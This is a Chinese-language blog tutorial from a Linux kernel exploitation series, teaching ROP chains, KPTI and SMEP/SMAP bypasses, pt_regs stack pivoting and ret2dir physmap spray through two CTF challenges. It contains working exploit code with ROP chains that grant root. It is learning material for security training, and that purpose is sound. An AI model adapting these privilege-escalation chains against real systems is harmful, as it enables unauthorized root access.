---
id: Kernel-How2Kernel-0x01-ROP
aliases: []
tags:
  - Kernel
  - tutorial
date: 2024-03-18 19:02:34
draft: false
title: "Kernel - How2Kernel 0x01: ROP and pt-regs"
---

> 近期又参与了一些实验室的工作，主要都是在 fuzz 动态链接库。想做一些更底层的内容却无从下手，只能先从 CTF kernel 题做起了。

> [!todo] 
> **Linux Kernel Pwn 系列博客预计包括：**
> 
> - [x] [[kernel-How2Kernel-0x00-Foundation|Environment and Basic LPE]]
>     - 基础知识
>     - 一些常见的非预期解
>     - Kernel Shellcode 提权
> - [ ] [[Kernel-How2Kernel-0x01-ROP|ROP and pt-regs]]
>     - 基本 ROP 链的构造
>     - `pt_regs` 结构体的利用
>     - ret2dir 绕过 SMEP / SMAP
> - [ ] slub 分配器
> - [ ] 跨缓存的溢出与跨页的堆风水
> - [ ] Buddy System
>     - PageJack - Page UAF

---

在 [[Kernel-How2Kernel-0x00-Foundation|Kernel - How2Kernel 0x00: Environment and Basic LPE]] 中了解了内核提权的基本思路、调试方法后，可以正式地尝试一下内核中的 ROP，即用 ROP 重写之前的提权 shellcode，掌握更完整的内核漏洞利用流程。博客中也会包含 ret2dir 等有趣的技巧，顺带介绍 ~~曾经~~ 对利用帮助巨大的 `pt_regs` 结构体。

> [!ATTENTION] 
> 随着保护技术的发展与完善，文中的一些技巧已经很难直接套用到较新版本内核的利用中，不过思路还是值得学习并动手实践的。

# 内核态与用户态

首先回过头来思考内核漏洞利用的目标，之所以能够实现提权是因为操作系统本身也不过是一种软件，是位于物理内存中的代码和数据，在**分级保护域**（_保护环，Rings_）的设计思路下 CPU 在执行操作系统内核代码时拥有**高权限环境**（_Ring 0_），而在运行用户代码时通常运行在**低权限环境**（_Ring 3_）。

> [!info] 
> CPU 处在的保护环通常通过 CS 段寄存器的最低 2 位判断，`00` 表明处在 Ring 0，`11` 表明处在 Ring 3。

> [!question] 
> 还有更高的权限吗？事实上在启动引导过程中需要高于 Ring 0 的权限来完成一些底层的系统管理任务，如电源管理，但是在启动后就不需要再调整设置了，因此就有通常被称为 [[UEFI-pwn-0x00|ring -2 的 SMM Mode]] 等特权级别。

用户态与内核态经常需要切换：

## 用户态进入内核态

如前所述，用户态的能力是受限的，在下述情况下就会进入内核态：

1. **系统调用**：当用户程序需要访问操作系统内核的功能时（如文件操作、网络通信等）,就需要通过系统调用来请求内核提供服务。这时会从用户态切换到内核态，待内核完成服务后再切换回用户态。
2. **中断**：当硬件设备需要操作系统处理某些事件时（如键盘输入、磁盘读写完成等），会产生中断。此时 CPU 会立即停止当前任务，切换到内核态来处理中断。
3. **异常**：当程序运行出现异常情况时（如除零错误、缺页异常等），CPU 会切换到内核态进行相应的异常处理。

**状态切换**的关键步骤包括：

1. **设置 gs 寄存器的值**：
    - GS 是一个重要的段寄存器，在用户态 GS 通常指向用户程序的 TLS；在内核态 GS 需要指向内核的 per-CPU 数据结构。
    - 通常在进入内核态（例如系统调用的入口）使用 `swapgs` 指令，交换 GS 寄存器的值和一个特定的 MSR（Model Specific Register）中的值（通常是 `IA32_KERNEL_GS_BASE`，地址 `0xC0000102`）。
    - 通常只能在 Ring 0 下进行 MSR 寄存器的操作与 `swapgs` 指令的调用。
2. **切换栈顶指针**：
    - 将用户态栈顶指针记录到 CPU 独占变量区（per-CPU），并从中取出内核栈顶存入 `RSP`。
3. **保存用户态寄存器信息**：
    - 将用户态的寄存器值依次压入内核栈。
    - 这些寄存器值按照特定的顺序压栈，在内核栈底构成 `pt_regs` 结构体。
4. 在内核态完成相应操作。

在需要劫持控制流的 Kernel PWN ROP 中，通常要提前记录用户态的 CS、SS、RSP、rflags 寄存器，以便后续完成提权并回到用户态：

```c
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;");
  info("Status has been saved.");
}
```

> [!info] 
> 关于代码板子可以参考博客 [[Pwn-Cheatsheet]]，或者我的 [Nixos 配置文件](https://github.com/AvavaAYA/nix-config/tree/hyperv)

## 内核态回到用户态

在内核态完成相应的操作后就会返回用户态继续执行用户空间代码：

1. `swapgs` 切换回用户态 GS 的值；
2. `iretq + ret_addr + cs + rflags + sp + ss` 回到用户态地址。

用 ROP 链的形式写出来就是：

```c
swapgs;
iretq;
ret_addr;
user_cs;
user_rflags;
user_sp;
user_ss;
```

当然也可以直接复用内核代码中返回用户态的 gadget，相关代码在 `arch/x86/entry/entry_64.S` 的 `swapgs_restore_regs_and_return_to_usermode` 函数中：

```c
swapgs_restore_regs_and_return_to_usermode_plus_22:
    mov    rdi,rsp
    mov    rsp,QWORD PTR gs:0x5004
    push   QWORD PTR [rdi+0x30]
    push   QWORD PTR [rdi+0x28]
    push   QWORD PTR [rdi+0x20]
    push   QWORD PTR [rdi+0x18]
    push   QWORD PTR [rdi+0x10]
    push   QWORD PTR [rdi]
    push   rax
    jmp    tag1

tag1:
    pop    rax
    pop    rdi
    swapgs
    jmp    tag2

tag2:
    test   BYTE PTR [rsp+0x20],0x4
    jne    shouldnt_touch
    iretq
```

即只需要在栈上布置好：

```c
swapgs_restore_regs_and_return_to_usermode + 22;
0;
0; 因为 tag1 处 pop 了两次，占位
ret_addr;
user_cs;
user_rflags;
user_sp;
user_ss;
```

这样也可以成功返回用户态并执行 `ret_addr` 处的代码。

---

# Chal-0x03: QWB-2018-core

- 附件：[Google Drive](https://drive.google.com/file/d/1c5P7f7tujaNRdNI6wHGKjMLjOiGVJETq/view?usp=sharing)

> [!note] 
> 是一道很经典的内核题，尽管从现在角度来看 `4.15.8` 版本的内核非常古老，但还是集成了 KASLR、KPTI、SMEP / SMAP 等基本保护，大致上可以通过 CPU 的标志位来判断：`cat /proc/cpuinfo | grep flags`
>
> 对于这道题，博客中将会逐步开启保护，介绍 Kernel ROP 和基本的保护绕过技巧。

## 如何开始？

1. 解包文件系统：

```bash
❯ ls
bzImage  core.cpio  start.sh  vmlinux
❯ file ./core.cpio
./core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix, original size modulo 2^32 53442048
❯ mv ./core.cpio{,.gz}
❯ gzip -d ./core.cpio.gz
❯ mkdir rootfs && cd rootfs
❯ cpio -idm < ../core.cpio
104379 blocks
❯ ls
bin  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux
```

2. 修改 `init` 和 `start.sh` 启动脚本完成利用的准备工作，使题目能够正常启动并简化调试流程（每次只需要编译 exp 到指定文件，避免反复打包）：

```bash
# 在 init 中加入：

[ -e /dev/sda ] && cat /dev/sda >/bin/pwn
chmod 755 /bin/pwn

## 此外还可以顺便注释掉定时关机、修改权限后重新打包，便于调试查看地址等
setsid /bin/cttyhack setuidgid 0000 /bin/sh

# 修改 start.sh 如下：
##  改大内存防止启动失败
##  其中 exploit 对应 exp.c 的编译产物

#!/usr/bin/env bash
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd ./core.cpio \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
    -drive file=exploit,format=raw \
    -s \
    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
    -nographic
```

3. 重新打包题目：

```bash
find . -print0 | cpio --null -ov --format=newc >../core.cpio
```

---

## 分析

接下来把 `rootfs/core.ko` 内核模块拖进 ida，就是常规的逆向分析流程了， ~~相比于用户态的虚拟机题，内核 pwn 还是很少在逆向上设置门槛~~ 。

关于内核模块中实现的系统调用，可以到 `init_module` 函数中找 `core_fops` 结构体，其中就列出了所有实现的接口，一般比较需要细看的就是 ioctl，其实就是一个「菜单」，通过 `ioctl(fd, cmd, args)` 的形式进行菜单功能调用。

进入 `core_ioctl` 函数立刻就可以发现全局变量 off 非常可疑，因为它被用作缓冲区偏移量的同时也是用户可控的，并且没有任何检查：

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk(&unk_2CD);
      off = a3;
      break;
    case 0x6677889A:
      printk(&unk_2B3);
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

`core_read` 函数中从内核栈上拷贝 0x40 字节到用户态缓冲区中，提供了越界读：

```c
unsigned __int64 __fastcall core_read(__int64 a1)
{
  char v5[64]; // [rsp+0h] [rbp-50h] BYREF

  strcpy(v5, "Welcome to the QWB CTF challenge.\n");
  copy_to_user(a1, &v5[off], 64LL);
}
```

来到最后一个接口，`core_copy_func` 里面有一个整数溢出导致的栈溢出：

```c
__int64 __fastcall core_copy_func(__int64 a1)
{
  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF

  v2[8] = __readgsqword(0x28u);
  if ( a1 > 63 )
  {
    return 0xFFFFFFFFLL;
  }
  else
  {
    qmemcpy(v2, &name, (unsigned __int16)a1);
  }
}
```

接下来就可以写出利用板子，包括状态保存、地址泄漏、漏洞触发（其中找偏移有很多种方法，笔者通常用 gdb 加载有符号的 vmlinux 来看）：

> [!INFO] 
> 笔者通常使用 ROPgadget 导出到 nvim 中找 gadget，但是 ROPgadget 在默认情况下找不到 `iretq`，之前尝试过 rp++，找到的 gadget 也有问题，可以用 `objdump -M intel -d vmlinux` 来找相关 gadget

```c
// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"

extern size_t user_cs, user_ss, user_rflags, user_sp;
int fd;
size_t canary, kaslr_offset;
size_t buf[0x20];

int main() {
    save_status();
    fd = open("/proc/core", 2);

    info("STEP 0 - Leak KASLR");
    ioctl(fd, 0x6677889C, 0x40);
    ioctl(fd, 0x6677889B, (char *)buf);
    canary = buf[0];
    kaslr_offset = buf[4] - 0x140df1 - 0xffffffff8109c8e0;
    log(canary);
    log(kaslr_offset);

    size_t init_cred = kaslr_offset + 0xffffffff8223d1a0;
    size_t commit_creds = kaslr_offset + 0xffffffff8109c8e0;
    size_t prepare_kernel_cred = kaslr_offset + 0xffffffff8109cce0;
    size_t swapgs_restore_regs_and_return_to_usermode =
        kaslr_offset + 0xffffffff81a008da;

    size_t pop_rdi_ret = kaslr_offset + 0xffffffff81000b2f;
    size_t pop_rdx_ret = kaslr_offset + 0xffffffff810a0f49;
    size_t mov_rdi_rax_jmprdx = kaslr_offset + 0xffffffff8106a6d2;
    size_t mov_cr3_rax_ret = kaslr_offset + 0xffffffff8107c33e;
    size_t iretq = kaslr_offset + 0xffffffff81050ac2;
    size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a012da;

    info("STEP 1 - Stack Overflow");
    int i = 8;
    buf[i++] = canary;
    buf[i++] = 0;


    write(fd, buf, 0x100);
    ioctl(fd, 0x6677889A, 0xffffffffffff0100ULL);

    return 0;
}
```

此后在板子的基础上讨论基本 ROP 链的构造与 SMEP / SMAP / KPTI 保护的绕过：

---

## 常规 ROP

对于最原始的情况，提权只需要布置好 `commit_creds(prepare_kernel_cred(NULL))` 的 ROP 链即可。因为 kernel 中的 gadgets 非常充足，设置参数 rdi 为上一个函数的返回值 rax 也不是什么难事：

```c
    info("\tSolution 1.1 - Normal ROP");
    buf[i++] = pop_rdi_ret;
    buf[i++] = 0;
    buf[i++] = prepare_kernel_cred;
    buf[i++] = pop_rdx_ret;
    buf[i++] = commit_creds;
    buf[i++] = mov_rdi_rax_jmprdx;
    buf[i++] = swapgs_popfq_ret;
    buf[i++] = 0;
    buf[i++] = iretq;
    buf[i++] = (size_t)get_shell;
    buf[i++] = user_cs;
    buf[i++] = user_rflags;
    buf[i++] = user_sp;
    buf[i++] = user_ss;
    log(i);
```

> [!NOTE] 
> 但是布置上述 ROP 链发现提权失败了：`Segmentation fault`，这是因为 Linux 4.15 中就引入了内核页表隔离 KPTI 机制，并且反向移植到了 4.14.11，4.9.75，4.4.110 上。

---

## KPTI - 内核页表隔离

> [!NOTE] 
> KPTI 不支持运行过程中开启或关闭，可以在 cmdline 中增加 `kpti=1` 或 `nopti` 来控制是否启用。

顾名思义，内核页表隔离就是 ~~隔离了内核态页表和用户态页表（什么废话）~~ 。Linux 中使用四级页表，而最上层的 PGD 页全局目录就存储在 **CR3** 寄存器中，要实现虚拟地址到真实地址的映射就依赖于 CR3 的值，因此 KPTI 就在此之上实现了两套页表用来隔离用户态空间和内核态空间：

```c
No PTI:                          With PTI:

+----------+                     +----------+  
|          |                     |          |  
| Kernel   |                     | Kernel   |  
|          |                     |          |  
| Space    |                     | Space    |  +----------+
|          |                     |          |  | Incomplete Kernel Code
|----------|                     |----------|  |----------|
|          |                     |          |  |          |
| User     |                     | User (NX)|  | User     |
|          |                     |          |  |          |
| Space    |                     | Space    |  | Space    |
|          |                     |          |  |          |
+----------+                     +----------+  +----------+
内核态和用户态使用相同的页表            内核态页表    用户态页表
```

这种隔离带来了如下限制：

- 在内核态中映射了 **完整用户空间和内核空间** ，但是 **用户空间** 的所有页顶级表项都被标记了 **NX 不可执行** ，因此 ret2usr 不再可行；
- 在用户态的这套页表中，只有 **极少量的内核空间映射** ，包括中断处理、系统调用入口等必要的地址。

这两套页表的切换也很直接：

1. 两张表各占 4k，紧挨着存放在连续的内存空间中，并且起始地址对齐到页；
2. 内核页表在低地址，用户页表在高地址；
3. 由 1，2 就可以发现切换页表时只需要反转 `CR3[12]` 的二进制位。

### 设置 CR3 切换页表

因此在开启 KPTI 的情况下，可以再观察内核代码中返回用户态的 gadget，相关代码在 `arch/x86/entry/entry_64.S` 的 `swapgs_restore_regs_and_return_to_usermode` 函数中，切换的代码简化为：

```c
mov rdi, cr3;
or rdi, 0x1000;
mov cr3, rdi;
```

因此可以构造出如下 ROP 链：

```c
    info("\tSolution 1.2 - Set CR3 with swapgs_restore_regs_and_return_to_usermode");
    buf[i++] = pop_rdi_ret;
    buf[i++] = init_cred;
    buf[i++] = commit_creds;
    buf[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
    i += 2;
    buf[i++] = (size_t)get_shell;
    buf[i++] = user_cs;
    buf[i++] = user_rflags;
    buf[i++] = user_sp;
    buf[i++] = user_ss;
    log(i);
```

### signal 系统调用劫持 SEGV 信号

可以注意到上面的报错是 SEGV 而不是 kernel panic，这是因为程序已经结束 ROP，用 `iretq` 返回用户态时，因为 CR3 还保留着内核态的那套页表，导致用户空间代码没有执行权限：

1. 用户态踩到没有执行权限的内存；
2. 触发异常，进入内核态处理；
3. 发送段错误信号，回到用户态；
4. 用户态收到 SEGV 信号，终止程序的运行；

因为此时在内核态是正常的异常处理流程，并且结束后还会成功切换页表回到用户态，因此只需要能 hook 掉 SEGV 信号的处理流程，让程序执行想要的用户态代码即可：

```c
void segfault_handler(int sig) {
    // 定义 handler 函数
    success("Returning root shell:");
    get_shell();
    exit(0);
}

// ...
// 在 main 函数最开始的地方，调用 signal hook 掉 SEGV 的信号处理流程
    signal(SIGSEGV, segfault_handler);
```

于是就可以绕过 KPTI 保护成功提权了。

---

## ret2usr 与 SMEP / SMAP 保护

> [!INFO] 
> ret2usr 的攻击手段随着 KPTI 的出现已经消声觅迹了，不过还是可以结合看看 SMEP / SMAP 保护的基本原理与绕过。

> [!NOTE] 
> - SMEP 即 Supervisor Mode Execution Protection，禁止执行用户空间代码；
> - SMAP 即 Supervisor Mode Access Protection，禁止访问用户空间代码；
>
> 那在 SMAP 开启后内核该怎么执行 copy to / from user 函数呢？
>
> 可以参考到源码：一路跟入 [copy_from_user](https://elixir.bootlin.com/linux/v5.8/source/include/linux/uaccess.h#L141) 能发现最终调用到 [stac](https://elixir.bootlin.com/linux/v5.8/source/arch/x86/include/asm/smap.h#L50)，这会设置 `RFLAGS.AC` 标志位，可以暂时关闭 SMAP，在结束之后再调用 clac 重置标志位来重新开启 SMAP。
>
> [Reference - How does the linux kernel temporarily disable x86 smap in copy from user](https://stackoverflow.com/questions/61440985/how-does-the-linux-kernel-temporarily-disable-x86-smap-in-copy-from-user)

直接的 ret2usr 写起来非常简单，省去了找 ROP 链的麻烦：

```c
// 用户态用函数指针写个 commit_creds(prepare_kernel_cred(NULL)) 即可：
void get_root(void) {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```

对于没有开启 SMEP / SMAP / KPTI 保护的情况下，直接在内核态下跳转到上述函数地址就能实现提权，因为内核态保留了对用户空间的完整映射。但是对于开启了 SMEP / SMAP 的情况，内核态下访问用户空间会直接引起 kernel panic。

而 CR4 寄存器的 `CR4[20]` 和 `CR4[21]` 分别标识了 SMEP / SMAP 的开启和关闭，可以找到 kernel 中的 gadget：

1. 方法 1 - 直接将 `0x6f0` 存入 CR4 寄存器；
2. 方法 2 - 通过运算将 CR4 的相应位置清零。

但是在开启 KPTI 后，若在内核态下在调用到用户态的代码，就相当于在内核态下执行没有执行权限的内存地址，会直接导致 kernel panic，因此 ret2usr 已经过时。

---

# pt_regs

可以进一步考虑内核栈的结构，即是否有用户可控的数据会被布置到内核栈的某个地方？关注系统调用在 kernel 中的入口函数 [entry_SYSCALL_64](https://elixir.bootlin.com/linux/v6.11/source/arch/x86/entry/entry_64.S#L87)，就能发现 `call do_syscall_64` 之前会先在内核栈上布置 `pt_regs` 结构体，其[定义](https://elixir.bootlin.com/linux/v6.11/source/arch/x86/include/uapi/asm/ptrace.h#L44)为：

```c
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
	unsigned long r15;
	unsigned long r14;
	unsigned long r13;
	unsigned long r12;
	unsigned long rbp;
	unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
	unsigned long r11;
	unsigned long r10;
	unsigned long r9;
	unsigned long r8;
	unsigned long rax;
	unsigned long rcx;
	unsigned long rdx;
	unsigned long rsi;
	unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
	unsigned long orig_rax;
/* Return frame for iretq */
	unsigned long rip;
	unsigned long cs;
	unsigned long eflags;
	unsigned long rsp;
	unsigned long ss;
/* top of stack page */
};
```

即系统调用的入口处会在 **内核栈底** 保存用户态的一系列寄存器，构成 `pt_regs` 结构体，这就给漏洞利用带来了便利。

> [!Attention] 
> 在内核版本 5.13 之前 `pt_regs` 结构体和栈顶的偏移值基本是固定的（**因为内核栈只有一个 page**），通常可以借助 `add rsp, val ; ret` 的 gadget 劫持一处函数指针就能实现进一步 ROP 利用。
>
> 但是，在 5.13 及之后的 `do_syscall_64` 函数入口处，新增了一行 [`add_random_kstack_offset();`](https://elixir.bootlin.com/linux/v5.13-rc1/source/arch/x86/entry/common.c#L41)，来源于 [2021 年 的一个 commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14)，效果是在栈底的 `pt_regs` 之上放了一个不超过 0x3FF 的偏移，使得利用的稳定性大幅下降。

---

# Chal-0x04: kgadget

- 附件：[Google Drive](https://drive.google.com/file/d/1Uh6ahhVQDHzgc7JbHm-MahbqPSnj-FwF/view?usp=sharing)

> [!INFO] 
> 这是一道标准的 ret2dir 例题，其中也需要借助 `pt_regs` 来完成栈迁移。

题目的 kgadget.ko 中只有一个 ioctl 是有用的，里面先对 rdx 解引用，再清空了栈上部分内容（其实这里就是 `pt_regs` 结构体的区域），最后将控制流跳转到 rdx 解引用得到的地址：

```c
param = rdx;
    mov     rbx, [param];
    mov     [rbp-18h], rsp;
    mov     rax, [rbp-18h];
    mov     rdi, offset unk_3F8;
    add     rax, 1000h;
    and     rax, 0FFFFFFFFFFFFF000h;
    lea     rdx, [rax-0A8h];
    mov     [rbp-18h], rdx;
regs = rdx;
    mov     regs, 3361626E74747261h;
    mov     [rax-0A8h], rdx;
    mov     [rax-0A0h], rdx;
    mov     [rax-98h], rdx;
    mov     [rax-90h], rdx;
    mov     [rax-88h], rdx;
    mov     [rax-80h], rdx;
    mov     [rax-70h], rdx;
    call    __x86_indirect_thunk_rbx;
```

这里就存在两个问题：

> [!Question]
> `pt_regs` 还剩下哪些东西可以用？

先随便给一个合法地址，断点下到 `kgadget_base + 0x19A`，给每个寄存器打上标记后触发 ioctl：

```c
// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"

extern size_t user_cs, user_ss, user_rflags, user_sp;

int fd;

int main() {
    save_status();

    fd = open("/dev/kgadget", 2);

    __asm__("mov r15, 0xbeefdead;"
            "mov r14, 0x11111111;"
            "mov r13, 0x22222222;"
            "mov r12, 0x33333333;"
            "mov rbp, 0x44444444;"
            "mov rbx, 0x55555555;"
            "mov r11, 0x66666666;"
            "mov r10, 0x77777777;"
            "mov r9, 0x88888888;"
            "mov r8, 0x99999999;"
            "mov rcx, 0xaaaaaaaa;");

    ioctl(fd, 114514, 0xffffffff81c01310);

    return 0;
}
```

这时候看栈底就能找到一长串的标记值：

```c
0e:0070│+058 0xffffc9000022ff50 —▸ 0xffffffff81c0008c ◂— 0x9c8b4c58244c8b48
0f:0078│+060 0xffffc9000022ff58 ◂— 0x3361626e74747261 ('arttnba3')
10:0080│+068 0xffffc9000022ff60 ◂— 0x3361626e74747261 ('arttnba3')
... ↓     4 skipped
15:00a8│+090 0xffffc9000022ff88 ◂— 0x246
16:00b0│+098 0xffffc9000022ff90 ◂— 0x3361626e74747261 ('arttnba3')
17:00b8│+0a0 0xffffc9000022ff98 ◂— 0x88888888
18:00c0│+0a8 0xffffc9000022ffa0 ◂— 0x99999999
19:00c8│+0b0 0xffffc9000022ffa8 ◂— 0xffffffffffffffda
1a:00d0│+0b8 0xffffc9000022ffb0 —▸ 0x41a1cd ◂— 0x77fffff0003dc289
1b:00d8│+0c0 0xffffc9000022ffb8 —▸ 0xffffffff81c01310 ◂— 0x480824748b4856fc
1c:00e0│+0c8 0xffffc9000022ffc0 ◂— 0x1bf52
1d:00e8│+0d0 0xffffc9000022ffc8 ◂— 0x3
1e:00f0│+0d8 0xffffc9000022ffd0 ◂— 0x10
1f:00f8│+0e0 0xffffc9000022ffd8 —▸ 0x41a1cd ◂— 0x77fffff0003dc289
20:0100│+0e8 0xffffc9000022ffe0 ◂— 0x33 /* '3' */
21:0108│+0f0 0xffffc9000022ffe8 ◂— 0x246
22:0110│+0f8 0xffffc9000022fff0 —▸ 0x7ffcde93d670 ◂— 0x10
23:0118│+100 0xffffc9000022fff8 ◂— 0x2b /* '+' */
```

即只留下了 r8、r9 两个寄存器可用，这时候就可以布置 `pop rsp ; ret` 来完成栈迁移。

> [!Question]
> 题目开启了 smep / smap 保护，ROP 链和 RDX 参数该怎么布置？

在当前情况下，RDX 需要是指向存放内核代码段（gadget）地址的指针，内核中并不直接存在这种能够利用的函数指针，用户态的数据也由于保护的存在用不了，这时候就可以想到 ret2dir 技术。

## RET2DIR + Physmap Spray

该技术最初于 2014 年[提出](https://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf)，被用于绕过 SMEP / SMAP 等隔离保护，攻击的点在于内核态和用户态的虚拟地址可能会被映射到同一块物理地址上，而通过虚拟地址隔离实现的保护就此可以被绕过。

Ret2dir 中的 dir 就是指内核内存空间中的直接映射区，关注 [linux 官方文档中的 Linux Kernel Memory Map](https://elixir.bootlin.com/linux/v6.11/source/Documentation/arch/x86/x86_64/mm.rst) 也可以注意到这一块位于 `0xffff888000000000 - 0xffffc87fffffffff` 的 Direct Mapping Area：

```c
  ========================================================================================================================
      Start addr    |   Offset   |     End addr     |  Size   | VM area description
  ========================================================================================================================
                    |            |                  |         |
   0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm
  __________________|____________|__________________|_________|___________________________________________________________
                    |            |                  |         |
   0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical
                    |            |                  |         |     virtual memory addresses up to the -128 TB
                    |            |                  |         |     starting offset of kernel mappings.
  __________________|____________|__________________|_________|___________________________________________________________
                                                              |
                                                              | Kernel-space virtual memory, shared between all processes:
  ____________________________________________________________|___________________________________________________________
                    |            |                  |         |
   ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
   ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
   ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
   ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
   ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
  __________________|____________|__________________|_________|____________________________________________________________
                                                              |
                                                              | Identical layout to the 56-bit one from here on:
  ____________________________________________________________|____________________________________________________________
                    |            |                  |         |
   fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
                    |            |                  |         | vaddr_end for KASLR
   fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
   fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
   ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
   ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
   ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
   ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
   ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0
   ffffffff80000000 |-2048    MB |                  |         |
   ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
   ffffffffff000000 |  -16    MB |                  |         |
      FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset
   ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
   ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
  __________________|____________|__________________|_________|___________________________________________________________
```

对于 DMA，这段长达 64T 的虚拟内存空间直接映射了所有内存空间，即从 `page_offset_base` 到 `page_offset_base + 
MAX_MEMORY_SIZE` 的内存直接对应了整个物理地址空间。

这也就意味着除了直接 Direct Mapping Area 以外的所有虚拟内存空间在 Direct Mapping Area 内都必然存在一个对应的内存页，也就是其他虚拟内存对应的物理地址在 Direct Mapping Area 的映射，两块虚拟内存页对应着同一块物理内存页。

> [!Info] 
> 然而，这些映射关系并不要求所有映射到同一物理页的虚拟页具有相同的访问权限。例如：
> - Linux Kernel Text 段：内核的代码段通常具有 r-x（可读、可执行）权限。这确保了内核代码可以被执行，但不允许修改，以保护内核的完整性。
> - Direct Map 区域：在 Linux 内核中，直接映射区（Direct Mapping Area）用于将物理内存直接映射到内核的虚拟地址空间中。在这个区域中，对应于内核文本段的物理页可能仅具有 r__（只读）权限。这意味着即使这些物理页在直接映射区中被访问，它们也只能被读取，不能被修改或执行。
>
> *当然也可以用 USMA 等方法重新映射新的内存页绕过这种限制*

上述设计也是 ret2dir 攻击手段的基本原理，通常借助的是用户态 mmap 出来的内存可以在 Direct Mapping Area 找到的性质：

1. 利用 mmap 在用户空间大量喷射内存；
2. 由于 kmalloc 得到的堆块通常也来源于这块直接映射区，就可以通过泄漏内核堆拿到相关地址；
3. 基于泄漏得到的处于 Direct Mapping Area 的堆地址进行内存搜索，就可以稳定拿到用户态喷射的内存；

在大部分情况下并没有内存搜索的能力，这时候就可以采用 `Physmap Spray` 的手段布置大量同样的 payload，后随机选取一块合适的位于 Direct Mapping Area 的地址以求命中。

回到题目上，可以先验证上述喷射思路，先 mmap 大量内存并填满标记，到调试器中从 `0xffff888000000000 ~ 0xffffc87fffffffff` 的直接映射区中找到用户态喷射的内存映射，代码如下：

```c
#include "libLian.h"
#define SPRAY_NUM 0x4000
#define PAGE_SIZE 0x1000

extern size_t user_cs, user_ss, user_rflags, user_sp;

int fd;
size_t *physmap_spray_arr[SPRAY_NUM];

int main() {
    save_status();
    fd = open("/dev/kgadget", 2);

    physmap_spray_arr[0] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(physmap_spray_arr[0], 0xef, PAGE_SIZE);

    for (int i = 1; i < SPRAY_NUM; i++) {
        physmap_spray_arr[i] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], PAGE_SIZE);
    }

    __asm__("mov r9, 0x88888888;"
            "mov r8, 0x99999999;");

    ioctl(fd, 114514, 0xffff888000000000 + SPRAY_NUM * PAGE_SIZE * 2);
    return 0;
}
```

调试时按照 `SPRAY_NUM * PAGE_SIZE` 的步长依次查看直接映射区的数据，发现上面的地址是可行的。

---

现在这道题只剩最后一个问题，该布置什么样的 ROP 链才能稳定实现利用？毕竟目前只能执行一次 `call rbp`，内核中也不存在提权 `one_gadget`。

可以考虑如下构造：

